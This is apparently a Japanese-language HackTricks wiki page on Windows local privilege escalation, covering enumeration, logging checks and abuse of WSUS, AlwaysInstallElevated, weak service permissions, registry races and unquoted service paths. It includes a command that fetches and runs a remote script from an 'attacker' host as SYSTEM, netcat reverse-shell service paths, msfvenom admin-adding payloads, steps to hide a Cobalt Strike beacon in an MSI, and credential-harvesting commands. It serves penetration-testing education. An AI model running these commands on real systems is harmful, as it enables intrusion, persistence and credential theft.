# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Windows local privilege escalation の vector を探すための最適な tool:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Windows の初期理論

### Access Tokens

**Windows Access Tokens について知らない場合は、続行する前に以下のページを読んでください:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs の詳細については、以下のページを確認してください:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Windows の integrity levels について知らない場合は、続行する前に以下のページを読んでください:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Windows には、**system の enumeration を妨げたり**、executables を実行できないようにしたり、さらには**活動を検知したり**する可能性のあるさまざまな要素があります。privilege escalation の enumeration を開始する前に、以下の**ページを読み**、これらすべての**防御** **mechanisms** を**enumerate**してください:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess の silent elevation

`RAiLaunchAdminProcess` を通じて起動された UIAccess processes は、AppInfo の secure-path checks が bypass された場合、prompt なしで High IL に到達するために abuse できます。専用の UIAccess/Admin Protection bypass workflow は以下を確認してください:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop accessibility registry propagation は、arbitrary SYSTEM registry write（RegPwn）に abuse できます:<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

最近の Windows builds では、privileged local NTLM authentication が再利用された SMB TCP connection 経由で reflected される、**SMB arbitrary-port** LPE path も導入されました:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## System Info

### Version info の enumeration

Windows version に既知の vulnerability が存在するか確認してください（適用された patches も確認してください）。
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

この [site](https://msrc.microsoft.com/update-guide/vulnerability) は、Microsoft の security vulnerabilities に関する詳細情報を検索するのに便利です。この database には 4,700 件を超える security vulnerabilities が登録されており、Windows 環境が示す **massive attack surface** がわかります。

**システム上**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas には watson が組み込まれています)_

**システム情報を使用してローカルで**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**exploit の GitHub repos:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### 環境

環境変数に credential や Juicy info が保存されていませんか？
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShellの履歴
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript ファイル

[https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) で、これを有効にする方法を確認できます。
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell パイプラインの実行に関する詳細が記録され、実行されたコマンド、コマンドの呼び出し、スクリプトの一部が含まれます。ただし、完全な実行詳細や出力結果が記録されない場合があります。

これを有効にするには、ドキュメントの "Transcript files" セクションの手順に従い、**"Powershell Transcription"** ではなく **"Module Logging"** を選択してください。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowersShell ログから最後の15件のイベントを表示するには、次を実行します:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

スクリプトの実行に関する完全なアクティビティと全コンテンツの記録が取得され、実行時にコードのすべてのブロックが文書化されます。このプロセスにより、各アクティビティの包括的な監査証跡が維持され、forensics や悪意のある動作の分析に役立ちます。実行時にすべてのアクティビティを文書化することで、プロセスに関する詳細なインサイトが提供されます。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block のイベントログは、Windows Event Viewer の次のパスにあります: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**。\
最後の20件のイベントを表示するには、次を使用します:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### インターネット設定
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### ドライブ
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

更新が http**S** ではなく http を使用して要求されている場合、システムを compromise できます。

まず、cmd で以下を実行し、ネットワークが non-SSL WSUS update を使用しているか確認します。
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
または、PowerShell では次のようにします。
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
以下のような返信を受け取った場合:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
そして、`HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` または `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` が `1` と等しい場合。

**exploit可能です。** 最後のレジストリ値が `0` の場合、WSUSエントリは無視されます。

これらの脆弱性をexploitするには、[Wsuxploit](https://github.com/pimps/wsuxploit)、[pyWSUS ](https://github.com/GoSecure/pywsus) などのツールを使用できます。これらは、SSLではないWSUSトラフィックに`fake`な更新プログラムをinjectする、MiTM weaponized exploit scriptsです。

研究資料はこちらです：

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**完全なレポートはこちら**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
基本的に、このbugがexploitするflawは次のとおりです：

> ローカルユーザーのproxyを変更する権限があり、Windows UpdatesがInternet Explorerの設定で構成されたproxyを使用している場合、[PyWSUS](https://github.com/GoSecure/pywsus)をローカルで実行して自身のトラフィックをinterceptし、asset上でelevated userとしてcodeを実行できます。
>
> さらに、WSUS serviceはcurrent userの設定を使用するため、そのcertificate storeも使用します。WSUS hostname用のself-signed certificateを生成し、それをcurrent userのcertificate storeに追加すれば、HTTPおよびHTTPSのWSUSトラフィックの両方をinterceptできます。WSUSは、certificateに対するtrust-on-first-use型のvalidationを実装するためのHSTSに類似したmechanismを使用していません。提示されたcertificateがuserによってtrustedであり、正しいhostnameを持っていれば、serviceによってacceptedされます。

このvulnerabilityは、[**WSUSpicious**](https://github.com/GoSecure/wsuspicious) ツールを使用してexploitできます（once it's liberated）。

## Third-Party Auto-UpdatersとAgent IPC (local privesc)

多くのenterprise agentは、localhost IPC surfaceとprivileged update channelを公開しています。enrollmentをattacker serverへcoerceでき、updaterがrogue root CAまたはweak signer checksをtrustする場合、local userはmalicious MSIをdeliverでき、SYSTEM serviceにinstallさせることができます。一般化されたtechnique（Netskope stAgentSvc chain – CVE-2025-0309に基づく）はこちらを参照してください：


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (TCP 9401経由のSYSTEM)

Veeam B&R < `11.0.1.1261` は、**TCP/9401**上でlocalhost serviceを公開しており、attacker-controlled messagesを処理します。これにより、**NT AUTHORITY\SYSTEM**としてarbitrary commandsを実行できます。<sup>[[12]](#references)</sup>

- **Recon**: listenerとversionを確認します。例：`netstat -ano | findstr 9401` および `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`。
- **Exploit**: 必要なVeeam DLLsとともに`VeeamHax.exe`などのPoCを同じdirectoryに配置し、local socket経由でSYSTEM payloadをtriggerします：
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
サービスはコマンドを SYSTEM として実行します。
## KrbRelayUp

特定の条件下では、Windows の **domain** 環境に **local privilege escalation** の脆弱性が存在します。これらの条件には、**LDAP signing が強制されていない**環境、ユーザーが **Resource-Based Constrained Delegation (RBCD)** を設定できる self-rights を持っていること、およびユーザーが domain 内にコンピューターを作成できることが含まれます。重要なのは、これらの **requirements** が **default settings** で満たされることです。

[**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp) で **exploit** を確認してください。

攻撃の流れについて詳しくは、[https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup> を確認してください。

## AlwaysInstallElevated

**これら 2 つのレジストリが** **有効**（値が **0x1**）な場合、任意の権限を持つユーザーが `*.msi` ファイルを NT AUTHORITY\\**SYSTEM** として **install**（実行）できます。
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payload
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
meterpreter session がある場合は、**`exploit/windows/local/always_install_elevated`** モジュールを使用してこの technique を自動化できます。

### PowerUP

power-up の `Write-UserAddMSI` コマンドを使用すると、privileges を escalate するための Windows MSI binary を current directory 内に作成できます。この script は、user/group の追加を求める precompiled MSI installer を書き出します（そのため GIU access が必要です）。
```
Write-UserAddMSI
```
作成した binary を実行するだけで privileges を escalate できます。

### MSI Wrapper

この tools を使用して MSI wrapper を作成する方法については、この tutorial を読んでください。**execute** **command lines** だけが目的の場合は、"**.bat**" file を wrap できることに注意してください。


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Generate** した **new Windows EXE TCP payload** を Cobalt Strike または Metasploit で `C:\privesc\beacon.exe` に保存します。
- **Visual Studio** を開き、**Create a new project** を選択して、検索ボックスに "installer" と入力します。**Setup Wizard** project を選択し、**Next** をクリックします。
- project に **AlwaysPrivesc** などの名前を付け、場所に **`C:\privesc`** を指定し、**place solution and project in the same directory** を選択して、**Create** をクリックします。
- step 3 of 4（include する files の選択）に到達するまで **Next** をクリックし続けます。**Add** をクリックし、先ほど生成した Beacon payload を選択します。その後 **Finish** をクリックします。
- **Solution Explorer** で **AlwaysPrivesc** project を選択し、**Properties** で **TargetPlatform** を **x86** から **x64** に変更します。
- **Author** や **Manufacturer** など、installed app をより legitimate に見せるために変更できる properties もあります。
- project を右クリックして **View > Custom Actions** を選択します。
- **Install** を右クリックして **Add Custom Action** を選択します。
- **Application Folder** を double-click し、**beacon.exe** file を選択して **OK** をクリックします。これにより、installer の実行直後に Beacon payload が execute されます。
- **Custom Action Properties** で、**Run64Bit** を **True** に変更します。
- 最後に、**build** します。
- `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` という warning が表示された場合は、platform を x64 に設定していることを確認してください。

### MSI Installation

悪意のある `.msi` file の **installation** を **background** で execute するには:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
この脆弱性を悪用するには、次を使用できます: _exploit/windows/local/always_install_elevated_

## Antivirus と Detectors

### Audit Settings

これらの設定によって何が**ログ記録される**かが決まるため、注意してください。
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwardingでは、ログがどこに送信されるかを把握しておくことが重要です。
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** は、**ローカル Administrator パスワードの管理**を目的として設計されており、ドメインに参加しているコンピューターごとに、各パスワードが**一意で、ランダム化され、定期的に更新される**ことを保証します。これらのパスワードは Active Directory 内に安全に保存され、ACL を通じて十分な権限を付与されたユーザーのみがアクセスできます。これにより、認証されたユーザーはローカル admin パスワードを確認できます。


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

有効な場合、**平文パスワードは LSASS**（Local Security Authority Subsystem Service）に保存されます。\
[**このページで WDigest の詳細を確認**](../stealing-credentials/credentials-protections.md#wdigest)。
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1** 以降、Microsoft は Local Security Authority (LSA) に対する強化された保護を導入し、信頼されていないプロセスによるメモリの**読み取り**やコードのインジェクションの試みを**ブロック**して、システムのセキュリティをさらに強化しました。\
[**LSA Protection の詳細はこちら**](../stealing-credentials/credentials-protections.md#lsa-protection)。
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** は **Windows 10** で導入されました。その目的は、pass-the-hash attacks などの脅威からデバイスに保存された credentials を保護することです。| [**Credentials Guard の詳細はこちら。**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**ドメイン資格情報**は、**Local Security Authority**（LSA）によって認証され、オペレーティングシステムのコンポーネントによって利用されます。ユーザーのログオンデータが登録済みのセキュリティパッケージによって認証されると、通常、そのユーザーのドメイン資格情報が確立されます。\
[**Cached Credentialsの詳細はこちら**](../stealing-credentials/credentials-protections.md#cached-credentials)。
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## ユーザーとグループ

### ユーザーとグループの列挙

所属しているグループのいずれかに興味深い権限があるか確認してください
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Privileged groups

**特権グループに所属している場合、権限を昇格できる可能性があります**。特権グループと、それらを悪用して権限を昇格する方法については、こちらで学べます:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

このページで**token**について**詳しく学べます**: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens)。\
以下のページで、**興味深いtoken**と、それらを悪用する方法について**学んでください**:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Logged users / Sessions
```bash
qwinsta
klist sessions
```
### ホームフォルダー
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### パスワードポリシー
```bash
net accounts
```
### クリップボードの内容を取得する
```bash
powershell -command "Get-Clipboard"
```
## 実行中のプロセス

### ファイルとフォルダーの権限

まず、プロセスを一覧表示し、**プロセスのコマンドライン内にパスワードがないか確認します**。\
**実行中のバイナリを上書きできるか**、またはバイナリのフォルダーに対する書き込み権限があり、[**DLL Hijacking attacks**](dll-hijacking/index.html) を悪用できるかを確認します:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
常に実行中の [**electron/cef/chromium debuggers** を確認してください。権限昇格に悪用できる可能性があります](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md)。

**プロセスのバイナリの権限確認**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**プロセスのバイナリがあるフォルダーの権限を確認する（**[**DLL Hijacking**](dll-hijacking/index.html)**）**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### メモリからのパスワードマイニング

sysinternals の **procdump** を使用して、実行中のプロセスのメモリダンプを作成できます。FTP などのサービスは、**認証情報をメモリ内に平文で保持しています**。メモリをダンプして、認証情報を読み取ってみてください。
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### 安全でない GUI アプリ

**SYSTEM として実行されているアプリケーションでは、ユーザーが CMD を起動したり、ディレクトリを参照したりできる場合があります。**

例: 「Windows ヘルプとサポート」（Windows + F1）で「command prompt」を検索し、「Click to open Command Prompt」をクリックします。

## Services

Service Triggers により、特定の条件（名前付きパイプ/RPC エンドポイントのアクティビティ、ETW イベント、IP の利用可能状態、デバイスの接続、GPO の更新など）が発生したときに Windows がサービスを起動できます。SERVICE_START 権限がなくても、トリガーを発火させることで、特権サービスを起動できる場合があります。列挙および有効化の手法については、こちらを参照してください。

-
{{#ref}}
service-triggers.md
{{#endref}}

サービスの一覧を取得します：
```bash
net start
wmic service list brief
sc query
Get-Service
```
### 権限

**sc** を使用してサービスの情報を取得できます
```bash
sc qc <service_name>
```
各サービスに必要な権限レベルを確認するため、_Sysinternals_ のバイナリ **accesschk** を用意することを推奨します。
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
「Authenticated Users」がいずれかのサービスを変更できるか確認することを推奨します。
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[XP 用の accesschk.exe はこちらからダウンロードできます](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### service を有効化

（例として SSDPSRV で）次のエラーが発生した場合：

_システム エラー 1058 が発生しました。_\
_サービスを開始できません。無効になっているか、有効なデバイスが関連付けられていないことが原因です。_

次のコマンドで有効化できます。
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**サービス upnphost は動作するために SSDPSRV に依存することに注意してください（XP SP1 の場合）**

**この問題に対する別の回避策**は、次を実行することです:
```
sc.exe config usosvc start= auto
```
### **サービスバイナリパスの変更**

「Authenticated users」グループがサービスに対する **SERVICE_ALL_ACCESS** を保有している場合、サービスの実行可能バイナリを変更できます。**sc** を変更して実行するには:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### サービスを再起動する
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
さまざまな権限を通じて特権を昇格できます。

- **SERVICE_CHANGE_CONFIG**: サービスバイナリの再構成を許可します。
- **WRITE_DAC**: 権限の再構成を可能にし、サービス構成を変更できるようにします。
- **WRITE_OWNER**: 所有権の取得と権限の再構成を許可します。
- **GENERIC_WRITE**: サービス構成を変更する権限を継承します。
- **GENERIC_ALL**: サービス構成を変更する権限も継承します。

この脆弱性の検出と悪用には、_exploit/windows/local/service_permissions_ を利用できます。

### Services binaries weak permissions

サービスが **`LocalSystem`**、**`LocalService`**、**`NetworkService`**、または特権ドメインアカウントとして実行されており、**低権限ユーザーがサービス EXE またはその親フォルダーを変更できる場合**、**バイナリを置き換えてサービスを再起動する**ことで、サービスを hijack できることがあります。

**サービスによって実行されるバイナリを変更できるか**、またはバイナリが配置されている**フォルダーへの書き込み権限があるか**を確認してください（[**DLL Hijacking**](dll-hijacking/index.html)**。**\
**wmic**（system32 にはありません）を使用してサービスによって実行されるすべてのバイナリを取得し、**icacls** で権限を確認できます：
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
以下のように **sc** と **icacls** も使用できます：
```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
**`Everyone`**、**`BUILTIN\Users`**、または **`Authenticated Users`** に付与された危険な ACL を探します。特に、サービスの実行ファイルまたはそれを含むディレクトリに対する **`(F)`**、**`(M)`**、**`(W)`** に注意してください。実際の悪用手順は次のとおりです:<sup>[[27]](#references)</sup>

1. `sc qc <service_name>` でサービスアカウントと実行ファイルのパスを確認します。
2. `icacls <path>` でバイナリが書き込み可能か確認します。
3. サービスバイナリを payload または有効な悪意のあるサービスバイナリに置き換えます。
4. `sc stop <service_name> && sc start <service_name>` でサービスを再起動します（または再起動 / service trigger を待ちます）。

自動チェックに役立つツール:<sup>[[28]](#references)</sup>
```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```
> サービスが通常のユーザーによる再起動を許可していない場合は、起動時に自動的に開始されるか、サービスを再起動する failure action が設定されているか、またはそのサービスを使用するアプリケーションによって間接的にトリガーできるかを確認してください。

### Services registry modify permissions

サービス registry を変更できるか確認してください。\
次の方法で、サービス **registry** に対する **permissions** を **check** できます:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
**Authenticated Users** または **NT AUTHORITY\INTERACTIVE** が `FullControl` 権限を持っているか確認する必要があります。持っている場合、service によって実行される binary を変更できます。

実行される binary の Path を変更するには:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### 任意の HKLM value write を可能にする Registry symlink race（ATConfig）

一部の Windows Accessibility 機能は、ユーザーごとの **ATConfig** キーを作成します。このキーは後に **SYSTEM** プロセスによって HKLM のセッションキーへコピーされます。Registry **symbolic link race** により、この特権による書き込み先を **任意の HKLM path** へリダイレクトでき、任意の HKLM **value write** primitive が得られます。<sup>[[18]](#references)</sup>

主な場所（例: On-Screen Keyboard `osk`）:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` には、インストール済みの Accessibility 機能が一覧表示されます。
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` には、ユーザーが制御可能な設定が保存されます。
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` は、logon/secure-desktop transition 中に作成され、ユーザーによる書き込みが可能です。

Abuse flow（CVE-2026-24291 / ATConfig）:

1. SYSTEM に書き込ませたい **HKCU ATConfig** value を設定します。
2. secure-desktop copy を trigger します（例: **LockWorkstation**）。これにより AT broker flow が開始されます。
3. `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` に **oplock** を設定して **race に勝ち**、oplock が発生したときに **HKLM Session ATConfig** key を、保護された HKLM target への **registry link** に置き換えます。
4. SYSTEM が、攻撃者が選択した value をリダイレクト先の HKLM path に書き込みます。

任意の HKLM value write を取得したら、service configuration values を上書きして LPE に pivot します:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath`（EXE/command line）
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll`（DLL）

通常のユーザーが start できる service（例: **`msiserver`**）を選び、write の後に trigger します。**注:** public exploit implementation は race の一環として workstation を **lock** します。

Example tooling（RegPwn BOF / standalone）:<sup>[[19]](#references)</sup>
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Services registry AppendData/AddSubdirectory permissions

レジストリに対してこの権限を持っている場合、**このレジストリからサブレジストリを作成できる**ことを意味します。Windows servicesの場合、これは**任意のコードを実行するのに十分です**:


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

実行可能ファイルへのパスが引用符で囲まれていない場合、Windowsはスペースの前で終わるすべてのパスを実行しようとします。

たとえば、パスが _C:\Program Files\Some Folder\Service.exe_ の場合、Windowsは次のファイルを実行しようとします:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
組み込みの Windows サービスに属するものを除き、すべての unquoted service paths を一覧表示します：
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
